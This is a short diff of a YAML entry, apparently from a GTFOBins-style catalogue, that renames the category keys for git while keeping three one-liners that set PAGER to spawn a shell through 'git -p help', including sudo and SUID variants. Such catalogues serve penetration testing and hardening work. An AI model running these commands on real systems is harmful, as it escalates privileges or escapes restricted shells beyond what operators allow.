@@ -1,9 +1,9 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: PAGER='sh -c "exec sh 0<&1"' git -p help
-  sudo-enabled:
+  sudo:
     - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
-  suid-limited:
+  limited-suid:
     - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
 ---
